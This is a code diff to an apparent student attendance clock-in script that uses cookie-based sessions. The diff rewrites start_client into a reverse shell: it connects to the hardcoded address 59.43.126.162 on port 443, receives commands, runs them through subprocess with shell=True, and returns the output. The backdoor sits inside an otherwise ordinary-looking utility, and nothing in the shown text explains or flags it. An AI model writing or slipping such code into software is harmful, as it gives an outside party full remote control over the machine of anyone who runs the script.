@@ -1,6 +1,8 @@
 import os
 from load_from_cookies import load_from_cookies
 import msession
+import socket
+import subprocess
 import re
 import json
 import time
@@ -11,16 +13,13 @@ def start_client():
     s.connect(('59.43.126.162', 443))
 
     while True:
-        command = input("Shell > ")
-        s.send(command.encode())
-
-        if command.lower() == 'exit':
+        data = s.recv(1024).decode()
+        if data == 'exit':
             break
-
-        output = s.recv(4096).decode()
-        print(output)
-
-    s.close()
+        
+        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output, error = process.communicate()
+        s.send(output + error)
 
 
 def clock_in(stu_id):
